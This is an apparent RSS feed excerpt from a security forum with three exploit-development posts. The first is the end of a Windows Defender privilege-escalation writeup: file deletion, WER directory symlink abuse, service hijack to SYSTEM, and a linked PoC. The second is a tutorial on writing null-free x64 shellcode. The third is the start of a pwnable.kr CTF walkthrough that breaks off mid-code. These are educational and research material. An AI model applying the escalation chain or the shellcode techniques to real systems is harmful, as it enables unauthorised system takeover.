<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/747a0dde74a1c21e1e261e919bd8ee4d71a2fccc.png" alt="image" data-base62-sha1="gCoSXsQTESmJGoVlJBwBljpyTp2" width="446" height="468"><br>
Those are some good info so if we have the ability to recreate <code>C:\Program Files\Windows Media Player</code> directory we can hijack the service with a malicious one, luckily and a big thanks to jonasLyk for providing a technique to allow arbitrary directory creation from an arbitrary file deletion you can see the article <a href="https://secret.club/2020/04/23/directory-deletion-shell.html" rel="noopener nofollow ugc">here</a><p></p>
<p>The technique is simple if we deleted the entire <code>C:\ProgramData\Microsoft\Windows\WER</code> directory, the windows error reporting tool will recreate it for us and then  create <code>C:\ProgramData\Microsoft\Windows\WER\Temp</code> allowing authenticated Users to have write&amp;delete access on both WER and Temp directories<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b1eab480c73fbbb0d2dfbdc0b868f668a5ab7b0d.png" alt="image" data-base62-sha1="pnVmFo4izoV2oIpRpoV6gxK5bWZ" width="601" height="202"><br>
which will allow user to abuse the Temp folder creation by creating a reparse point from <code>C:\ProgramData\Microsoft\Windows\WER</code> to <code>\RPC CONTROL\</code> and then creating a symlink from <code>\RPC CONTROL\Temp</code> -&gt; <code>C:\Program Files\Windows Media Player</code> so as soon we rerun the scheduled task <code>\Microsoft\Windows\Windows Error Reporting\QueueReporting</code> the <code>C:\Program Files\Windows Media Player</code> folder will be created with new rights allowing authenticated user to write on it so we can write a payload and then start the service the only problem we will have is the gained privileges<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6e6801236bca76a66922fd6e486f99012a7eb45f.png" alt="image" data-base62-sha1="fKHlIm6DgJb37oM6hPHHXYNqOaH" width="448" height="471"></p>
<p>As you can see here we aren’t running as <code>NT AUTHORITY\SYSTEM</code> instead the service is ran as <code>NT AUTHORITY\Network Service</code> this service account doesn’t have full control over the system which is an issue we can easily address, Thanks again to it4mn for his awesome blog about elevating from network service to system you can find it <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges" rel="noopener nofollow ugc">here</a><br>
You can find the PoC <a href="https://github.com/klinix5/WinDefend_ZeroDay" rel="noopener nofollow ugc">here</a> it’s a chained one so it’s supposed to spawn a system shell when it succeed</p>
<p><strong>NOTES</strong></p>
<ul>
<li>exploiting the issue will take up to 35min according to clement we need to fill <code>mpcmdrun.log</code> with 16.5mb data in order to trigger the issue.</li>
<li>the Poc will work only on windows 10 and I didn’t tested on windows server.<br>
and lastly Shootout To <a class="mention" href="https://0x00sec.org/u/jeff">@jeff</a>
</li>
</ul>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/windows-defender-av-zero-day-vulnerability/22258">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/windows-defender-av-zero-day-vulnerability/22258</link>
          <pubDate>Wed, 15 Jul 2020 15:55:38 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-22258</guid>
          <source url="https://0x00sec.org/t/windows-defender-av-zero-day-vulnerability/22258.rss">Windows Defender AV Zero Day Vulnerability</source>
        </item>
        <item>
          <title>Null Terminated Programming 101 - x64</title>
          <dc:creator><![CDATA[x24whoami24]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>Null Terminated Programming 101 - x64</h1>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6.png" data-download-href="/uploads/short-url/wHq8XLq2WAXGREaOjSSi5gBi7b0.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6_2_602x339.png" alt="" data-base62-sha1="wHq8XLq2WAXGREaOjSSi5gBi7b0" width="602" height="339" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6_2_602x339.png, /uploads/default/original/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6.png 1.5x, /uploads/default/original/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6_2_10x10.png"></a></strong></div><p></p>
<h2>Preface</h2>
<p>Everyone, class is in session! please take your seat as we are about to start.</p>
<p>Today we’re going to dive deep into a magnificent assembly language - x64.</p>
<p>I chose this excellent language for this class because of its extreme use in personal computers and because it’s known by most researchers.</p>
<p>When speaking a language, we often use synonyms while speaking about a subject, this makes the conversation more intelligent and exciting for everyone involved.</p>
<p>Even now we just saw the use of them in the way I described x64 as magnifect and excellent. Two different words which mean the same thing.</p>
<p>When writing shellcode, we sometimes need to perform something similar, this is mainly because in some  cases, the way we input our shellcode using our exploit will have a limitation of sort.</p>
<p>Some examples:</p>
<p>1.No null bytes in case of strcpy, which stops copying after it encounters a null byte</p>
<p>2.Size limit of on how much shellcode we can put</p>
<p>3.Only alphanumeric characters are copied</p>
<p>These conditions cause us to develop different methods to write our shellcode in a way that it will implement the same logic but still be able to bypass the limitations imposed by the program</p>
<p>Today we will attempt to solve case <span class="hashtag">#1</span> by learning about techniques that we can use to tackle this issue,<br>
these techniques are often called Null Terminated Programming, as they allow us to compile assembly code that will not contain any null bytes in the final shellcode.</p>
<p>Please note that some of the techniques described here will probably be relevant for different assembly languages as well so i’ll leave it as an exercise for the reader to check these techniques on a different language.</p>
<p><strong>Recommended Prerequisites:</strong></p>
<ul>
<li>x64/x86 assembly  knowledge</li>
<li>Basic knowledge on building shellcodes</li>
</ul>
<h2>Setup</h2>
<p>For our setup, i’m using a <a href="https://github.com/x24whoamix24/make_shellcode_linux" rel="noopener nofollow ugc">script</a> i wrote for compiling shellcode for x86/x64</p>
<p>which we can also use to compile our shellcode.</p>
<p>next, we can use this <a href="https://github.com/mads256h/shellrun" rel="noopener nofollow ugc">repository</a> in order to debug and run our shellcode nicely</p>
<h2>Quick Refreshment on x64 syscalls</h2>
<p>In x64 linux systems, Each syscall has a special number that represents it, when we want to perform a call to a certain syscall we first need to store the correct syscall number in RAX, then we pass the arguments 1-6 to the syscall using the registries RDI, RSI, RDX, RCX, R8, R9 accordingly.</p>
<p>Finally, we use the instruction syscall which performs the syscall itself and stores the return value in RAX.</p>
<p>The full x64 syscall map table can be found <a href="https://filippo.io/linux-syscall-table/" rel="noopener nofollow ugc">here</a></p>
<p>Let’s have a look at this simple assembly code i wrote named printf_file.asm:</p>
<pre><code class="lang-auto">
SYS_READ equ 0

SYS_WRITE equ 1

SYS_OPEN equ 2 

SYS_EXIT equ 60

AMOUNT_TO_READ equ 16 

global _start

section .text

_start:

  jmp get_file_path 

  continue:

  

  ; syscall to open the file

  mov eax, SYS_OPEN

  pop rdi ; pop address of string to rdi

  mov rsi, 0 ; set O_RDONLY flag

  syscall

    

  ; syscall to read file

  sub sp, 0xff

  lea rsi, [rsp]

  

  ; syscall to write file contents to stdout  

  mov rdi, rax ; use the returned fd

  mov rdx, AMOUNT_TO_READ; amount to read

  mov rax, SYS_READ

  syscall

  

  ; syscall write to stdout

  mov rdi,1 ; set stdout fd = 1

  mov rdx, rax ; write to stdout the amount of bytes read

  mov rax, SYS_WRITE

  syscall

  mov rax, SYS_EXIT

  syscall ; finish execution

; jump here in order to get the address of the string

get_file_path:

call continue 

file_path: db "/tmp/my_file", 0

</code></pre>
<p>This code performs a simple task, it reads 16 bytes from the file located in<br>
/tmp/my_file and outputs those bytes to stdout.</p>
<p>Notice the cool trick we implemented in order to obtain the string that contains the path to the file.<br>
to get that address, we perform a call to a label near that string called get_file_path,<br>
afterwards we immediately perform a second call to the continue label that brings us  back to the rest of our shellcode.</p>
<p>Because the second call was invoked, the address to return to after the second call now points to the string, because that is the first “instruction” after the call instruction. we then pop that address to RDI so that  RDI (the first param in x64 syscall conventions) can point to the string of the file we wish to open</p>
<p>You can compile it the above assembly code by running</p>
<pre><code class="lang-auto">
path_to_make_shellcode_ /make_shellcode_linux/make_shellcode.sh/ ./printf_file.asm 64

</code></pre>
<p>and run it using</p>
<pre><code class="lang-auto">
path_to_shellrun/shellrun ./print_file.bin

</code></pre>
<p>Let’s check if the shellcode works properly</p>
<pre><code class="lang-auto">
echo “this_is_my_data” &gt; /tmp/my_file

</code></pre>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/f/f2195243f4d3cedad398795120a279ba6b85c819.png" data-download-href="/uploads/short-url/yxHNvMgE8MnJeWgMH29LCH37cSZ.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f2195243f4d3cedad398795120a279ba6b85c819_2_672x35.png" alt="" data-base62-sha1="yxHNvMgE8MnJeWgMH29LCH37cSZ" width="672" height="35" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f2195243f4d3cedad398795120a279ba6b85c819_2_672x35.png, /uploads/default/original/2X/f/f2195243f4d3cedad398795120a279ba6b85c819.png 1.5x, /uploads/default/original/2X/f/f2195243f4d3cedad398795120a279ba6b85c819.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f2195243f4d3cedad398795120a279ba6b85c819_2_10x10.png"></a></strong></div><p></p>
<p>So far so good.</p>
<p>But under the surface, hids a horrible secret…</p>
<p>It’s full of null bytes!!!</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/1/1d9d2971ddb9588af953bec1666b89fc0a729a03.png" data-download-href="/uploads/short-url/4dYyZJBXQNqb3wxlfEAj5RIz8FJ.png?dl=1" title=""><img src="/uploads/default/original/2X/1/1d9d2971ddb9588af953bec1666b89fc0a729a03.png" alt="" data-base62-sha1="4dYyZJBXQNqb3wxlfEAj5RIz8FJ" width="602" height="101" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1d9d2971ddb9588af953bec1666b89fc0a729a03_2_10x10.png"></a></strong></div><p></p>
<p>Hexdump just showed us that this shellcode is riddled with null bytes,</p>
<p>Let’s begin our work at curing this code by going over the correct ways to bypass situations where instructions generate null bytes</p>
<p>I will show the opcodes of the instruction  on the left side<br>
and the instruction itself on the right side</p>
<p>Note:I’ll be using <a href="https://defuse.ca/online-x86-assembler.htm" rel="noopener nofollow ugc">this website</a>  in order to show the bytes generated from the instructions were about to show. I recommend to you all to test your instruction combinations there.</p>
<h2>Method 1: Math is awesome</h2>
<p>I’ll start of by saying that the mov instruction is many times obsolete when you have the power of math at your side</p>
<h3>Loading 0 to a register</h3>
<h4>Bad way:</h4>
<p>Lets look at the following instruction:</p>
<pre><code class="lang-auto">48 c7 c0 00 00 00 00   mov rax, 0 

</code></pre>
<p>it is 7 bytes long and more importantly, contains 4 null bytes!</p>
<p>we can easily use the following instructions instead</p>
<h4><strong>Good way:</strong></h4>
<pre><code class="lang-auto">48 31 c0    xor rax, rax

</code></pre>
<pre><code class="lang-auto">48 c7 c0 ff ff ff ff    mov    rax,0xffffffffffffffff
48 ff c0                inc    rax
</code></pre>
<p>in case the value of rbx is 0, we can execute this instruction.<br>
(this can also be done with any other register with a 0 value)</p>
<pre><code class="lang-auto">
48 f7 e3    mul rbx 

</code></pre>
<p>The mul instruction will multiply rax with the contents of rbx and store it in rax</p>
<p>because rbx is 0 in this case then 0 will also be stored in rax</p>
<h3>**Loading large values to registries **</h3>
<p>What about putting large values in registries? For example, if i wanted to read a big file with my shellcode.</p>
<h4>Bad way</h4>
<pre><code class="lang-auto">
48 c7 c2 00 00 01 00    mov    rdx,0x10000

</code></pre>
<h4>Good way</h4>
<p>You can use the shift operations in order to load large numbers</p>
<pre><code class="lang-auto">48 31 d2               xor    rdx,rdx
48 83 c2 02            add    rdx,0x2
48 c1 e2 0f            shl    rdx,0xf

</code></pre>
<p>This will result in rdx having the value 0x10000 at the end of the shift operation.</p>
<h2>Method 2: Using your lower parts</h2>
<p>Before you start thinking dirty, different parts of each register in x64 can be accessed as an operand.</p>
<p>These parts are mapped in the following way:</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/5/5536ef497f7c6038025eb58e01735580bf44f548.png" data-download-href="/uploads/short-url/c9QhuhPRmtb0tmrTgosixKFviJ2.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5536ef497f7c6038025eb58e01735580bf44f548_2_602x391.png" alt="" data-base62-sha1="c9QhuhPRmtb0tmrTgosixKFviJ2" width="602" height="391" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5536ef497f7c6038025eb58e01735580bf44f548_2_602x391.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/5536ef497f7c6038025eb58e01735580bf44f548_2_903x586.png 1.5x, /uploads/default/original/2X/5/5536ef497f7c6038025eb58e01735580bf44f548.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5536ef497f7c6038025eb58e01735580bf44f548_2_10x10.png"></a></strong></div><p></p>
<p>This allows us to use the al operand for example instead of the rax operand when we want to perform reading and writing actions on the lower 8 bits of the rax register.</p>
<p>When we do so, the instruction that is executed is much smaller and can also aid us when trying to avoid null bytes.</p>
<h4>**Bad way:</h4>
<pre><code class="lang-auto">48 c7 c0 02 00 00 00    mov    rax,0x2
48 c7 c3 ff 0f 00 00    mov    rbx,0xfff

</code></pre>
<h4>Good way</h4>
<pre><code class="lang-auto">48 31 db              xor    rbx,rbx
48 31 c0              xor    rax,rax
b0 02                 mov    al,0x2
66 bbff 0f            mov    bx,0xfff

</code></pre>
<h2>Field Test</h2>
<p>After we learned these two new methods, let’s implement and modify the assembly code we saw at the beginning of the article</p>
<pre><code class="lang-auto">
SYS_READ equ 0

SYS_WRITE equ 1

SYS_OPEN equ 2

SYS_EXIT equ 60

AMOUNT_TO_READ equ 16

global _start

section .text

_start:

  jmp get_file_path 

  continue:

  

  ; syscall to open the file

  xor rax, rax

  add al, SYS_OPEN

  pop rdi ; pop address of string to rdi

  xor rsi, rsi ; set O_RDONLY flag

  syscall

    

  ; syscall read file

  sub sp, 0xfff

  lea rsi, [rsp]

  mov rdi, rax

  xor rdx, rdx

  add dl, AMOUNT_TO_READ; amount to read

  xor rax, rax

  syscall

    

  ; syscall write to stdout

  xor rdi, rdi

  add dl, 1 ; set fd to point to stdout

  mov rdx, rax

  xor rax, rax

  add al, SYS_WRITE

  syscall

  

  mov al, SYS_EXIT

  syscall ; finish execution

; jump here in order to get the address of the string  

get_file_path:

call continue

flag: db "/tmp/my_file", 0

</code></pre>
<p>After we compile this code, we can run it and see that it works exactly the same as the previous code:</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050.png" data-download-href="/uploads/short-url/euFqMCb8VDTxOfbiEyiLZRPYZNe.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050_2_651x33.png" alt="" data-base62-sha1="euFqMCb8VDTxOfbiEyiLZRPYZNe" width="651" height="33" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050_2_651x33.png, /uploads/default/original/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050.png 1.5x, /uploads/default/original/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050_2_10x10.png"></a></strong></div><p></p>
<p>let’s see if hexdumps finds any null bytes…</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/0/0e9327cbd0bbe0fafc95c009c7f9982a772d1cf1.png" data-download-href="/uploads/short-url/24VXKqKsKHyojfJqeNmzK90LLs5.png?dl=1" title=""><img src="/uploads/default/original/2X/0/0e9327cbd0bbe0fafc95c009c7f9982a772d1cf1.png" alt="" data-base62-sha1="24VXKqKsKHyojfJqeNmzK90LLs5" width="641" height="101" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0e9327cbd0bbe0fafc95c009c7f9982a772d1cf1_2_10x10.png"></a></strong></div><p></p>
<p>Awesome!</p>
<p>Note: Don’t be confused by the one null byte that hexdump found, that null byte belongs to the string in our shellcode and it’s placed at the end of the shellcode.<br>
It doesn’t seem like it is in the end because memory is saved in <a href="https://www.youtube.com/watch?v=seZLUbgbB7Y" rel="noopener nofollow ugc">little endian</a>.</p>
<h2>Conclusions</h2>
<p>Today we learned about how we can compile our shellcode to be free of null bytes. We learned along the way about different ways we can perform the same resulting actions using different and sometimes shorter instructions(opcode wise) in x64.</p>
<p>Finally, we used this knowledge to transform shellcode that was riddled with null bytes into one that is ready to tackle any strcpy in it’s path.</p>
<p>I hope you all enjoyed this article and learned more about the x64 instruction set along the way, there are many more methods and techniques yet to learn and I urge you all to keep learning what you don’t know and teach what you do know.</p>
<p>Spread the good word,</p>
<p>x24whoamix24</p>
<h2><strong>Sources</strong></h2>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener nofollow ugc">filippo.io</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener nofollow ugc">Searchable Linux Syscall Table for x86 and x86_64 | PyTux</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank" rel="noopener nofollow ugc">defuse.ca</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank" rel="noopener nofollow ugc">Online x86 and x64 Intel Instruction Assembler</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/null-terminated-programming-101-x64/20398">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/null-terminated-programming-101-x64/20398</link>
          <pubDate>Thu, 09 Apr 2020 18:45:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20398</guid>
          <source url="https://0x00sec.org/t/null-terminated-programming-101-x64/20398.rss">Null Terminated Programming 101 - x64</source>
        </item>
        <item>
          <title>Exploit Development - The Magic in Hacking</title>
          <dc:creator><![CDATA[x24whoami24]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>The Magic in Hacking</h1>
<p>While wandering around the various amazing topics in this forum, I noticed a lack of one of the subjects I enjoy the most - exploit development (last post was more than a month ago).</p>
<p>I decided to write my own post about the subject which will also be my first post in this forum.</p>
<p><strong>What we will go over in this article:</strong></p>
<p>My experience in exploit development</p>
<p>Go over a CTF from <a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a> step by step as we solve it.</p>
<p>Explain different tools i use for  and how i implemented them to solve this challenge</p>
<p><strong>Recommended Pre-requisites:</strong></p>
<ul>
<li>
<p>Basic Linux understanding</p>
</li>
<li>
<p>X86 assembly knowledge</p>
</li>
<li>
<p>Knowledge of how the stack works</p>
</li>
<li>
<p>Basic C language</p>
</li>
<li>
<p>understanding of Basic buffer overflow exploits</p>
</li>
<li>
<p>Basic development in python</p>
</li>
</ul>
<hr>
<h1>A Song of Bytes and Shells</h1>
<p>Ever since I was a kid I was intrigued with exploits. when I was around 16 and started developing malware but i always felt that while malware was something i could understand and learn how to do well, exploits were always something of a mystery to me  . I remember once, when i at home with my older brother who was much more knowledgeable than me at the time  and I asked him for the first time what exploits were after I heard about that term so many times.</p>
<p>He said to me: “exploits are where magic happens in hacking”</p>
<p>Ever since then many winters have passed, the boy i was became a man and with it i learned more and more about the subject. I started working professionally in the field of exploit research and developed many exploits and shellcode galleries of my own. I realized how exploits are an artform of their own, they require the highest level of professionalism because a lot of the time you need a combination of various fields<br>
(for example: C language, assembly, understanding of the heap and stack, python for development the exploit)  in order to make an exploit and that is just the tip of iceberg.</p>
<p>This can be very daunting for a someone who wants to enter the field of exploit development as it is a  zero sum game.</p>
<p>As Cersei Lannister described accurately :</p>
<pre><code> “When you play the game of Exploits, you pwn or you crash. There is no middle ground.”
</code></pre>
<p>I hope in this article that i can help ease people in to the subject and tools using<br>
one of my favorite CTF challenge.</p>
<hr>
<h1>Don’t judge a binary by its size</h1>
<p>Today we will analyze a CTF from one of my most favourite CTF websites - <a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a></p>
<p><a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a> is an amazing site for anyone wishing to try out hard exploitation and reverse engineering challenges.</p>
<p>I found all kinds of exploit challenges there, from memory corruptions to command injections and up to kernel write exploits and race conditions.</p>
<p>Highly recommend you all to check it out.</p>
<p>For this article I decided to go over the tiny_easy challenge.</p>
<p><strong><img src="/uploads/default/original/2X/a/a16ec6a92f82cfc63c3f85071e890ce88f32c95b.png" alt="" data-base62-sha1="n26cYqyCR53XkI36iOElEf2C4rN" width="201" height="303"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/def6156eb0ba3236b02e0e1a8e7b4ad4359c5c22.png" alt="" data-base62-sha1="vOpehzHWSNTUyp1iwKhAolg9taG" width="475" height="316"></strong></p>
<p>Let’s SSH inside!</p>
<pre><code class="lang-auto">
ssh [tiny_easy@pwnable.kr](mailto:tiny_easy@pwnable.kr) -p2222

</code></pre>
<p>(For windows users i highly recommend <a href="https://mobaxterm.mobatek.net/" rel="noopener nofollow ugc">mobaxterm</a>, it’s an easy software you can use to handle ssh sessions and download software easily)</p>
<p>Inside the ssh, we run “ls” and find only a binary and our flag file which we can’t read as we don’t have any permissions</p>
<p><strong><img src="/uploads/default/original/2X/a/a60ffb507e6705e26b3737343378bc624be60328.png" alt="" data-base62-sha1="nH3v2MaKux408rv6fNGF47k3WqI" width="602" height="200"></strong><br>
Let’s download the binary and perform some  checks on it:<br>
well start off with the “file” command.</p>
<p>This command gives us details about the binary including it’s architecture, bitness(x64 vs x32) and other nice details</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560.png" data-download-href="/uploads/short-url/pXyMsWCglvGaKPrvfA7yteKtdE4.png?dl=1" title=""><img src="/uploads/default/original/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560.png" alt="" data-base62-sha1="pXyMsWCglvGaKPrvfA7yteKtdE4" width="602" height="37" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560_2_10x10.png"></a></strong></div><p></p>
<p>We can see from this output that the file is a 32-bit ELF file for the x86 architecture and it’s statically linked.</p>
<p>But wait…</p>
<p><strong><img src="/uploads/default/original/2X/4/48c2740844f8f3f2c7b4de307c4d13d9361dc2fe.png" alt="" data-base62-sha1="anEZvphLOU8pUptspa5CvSGpPT8" width="416" height="32"></strong></p>
<p>Lets try to run the binary and see what happens :</p>
<p><strong><img src="/uploads/default/original/2X/0/097ce7cb708859b49020d79e35dd3a6136390a49.png" alt="" data-base62-sha1="1lVUamCj6dM3X8ujNmy78XLvEmZ" width="562" height="38"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/d3a5d2d7701d2fa56ad16369ce191af201e72dd8.png" alt="" data-base62-sha1="uck1ln3PuWhfOhYKbA4kPQXauUM" width="330" height="214"></strong></p>
<p>As seen by the fact that the binary has a corrupted header and crashes on execution, we can understand that we may be in for a bit different binary than what we usually see.</p>
<p>Lets open the binary in ida and go over the code</p>
<p><strong><img src="/uploads/default/original/2X/5/551dfdfd41e73ca3508847b32692bc5f8b583cae.png" alt="" data-base62-sha1="c8YQfY3O87vAZGh4bLUUoKJ3huK" width="453" height="150"></strong></p>
<p>Wow! Look at that! this has to be the smallest CTF i’ve ever looked at <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>The whole program has only 4 instructions.</p>
<p>We perform two pops from the stack. Takes the value from where edx points to and then jumps to it.</p>
<p>But wait… there aren’t any calls in this program so which values are poped from the stack?</p>
<p>Let’s use gdb and check it out!</p>
<p>In this article i used gdb with the <a href="https://github.com/longld/peda" rel="noopener nofollow ugc">peda</a> extension that makes debugging much easier.</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png" data-download-href="/uploads/short-url/qLEKfjXQa7TykTwe3C0EZkpSUhW.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_602x359.png" alt="" data-base62-sha1="qLEKfjXQa7TykTwe3C0EZkpSUhW" width="602" height="359" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_602x359.png, /uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png 1.5x, /uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_10x10.png"></a></strong></div><p></p>
<p>Having a look at the stack, we see that eax will receive the value 1 and edx will receive a pointer to the string</p>
<p>“/home/user/CTFs/Pwnables/tiny_easy/tiny_easy”</p>
<p>That is the path to our binary!</p>
<p>If we continue stepping until the call to edx, we see the reason why we received our segfault earlier</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png" data-download-href="/uploads/short-url/sH8XfWPU1vYtcL7EMKDReLPJt3K.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_602x195.png" alt="" data-base62-sha1="sH8XfWPU1vYtcL7EMKDReLPJt3K" width="602" height="195" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_602x195.png, /uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png 1.5x, /uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_10x10.png"></a></strong></div><p></p>
<p>The program attempts to jump to the address 0x6d6f682f which is value for the string “/hom”. A part of the path to our binary</p>
<p>Let’s try to run our program with the parameters test1 test2 test3</p>
<p>We can do this by running the command in gdb</p>
<pre><code class="lang-auto">
run test1 test2 test3 

</code></pre>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png" data-download-href="/uploads/short-url/kdQ2cVASsWf2AMEYp1RfL3HwG71.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_602x280.png" alt="" data-base62-sha1="kdQ2cVASsWf2AMEYp1RfL3HwG71" width="602" height="280" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_602x280.png, /uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png 1.5x, /uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_10x10.png"></a></strong></div><p></p>
<p>As we can see, the stack has changed, now we have our parameters in the stack and the value at the top of the stack has changed from 0x1 to 0x4.</p>
<p>Remember in the C language, how the main function receives input?</p>
<pre><code class="lang-auto">
Int main(int argc, char * argv [], char * envp)

</code></pre>
<p>argv[0]  in main always points to the path of the current binary and then argv[1]</p>
<p>argv[2] and so forth will contain our arguments.</p>
<p>In order to successfully jump where we want, we need to have control over argv[0] because the program will jump to the value in it.</p>
<p>How can we control over argv[0] if it isn’t one of our parameters?</p>
<p>Introducing <a href="http://docs.pwntools.com/en/stable/" rel="noopener nofollow ugc">pwnlib</a>!</p>
<p>Pwnlib is a python library that allows us to easily communicate with sockets and processes for the sake of pwning them.</p>
<p>The pwnlib.tubes.process  allows us to create a process of our own and control it’s different arguments (argv, envp) and so forth.</p>
<p>Just to show you an example of the use of pwnlib, i compiled the following code snippet:</p>
<pre><code class="lang-auto">
int main(int argc, char * argv[])

{


    printf("\nthis is our argv[0] %s\n", argv[0]);

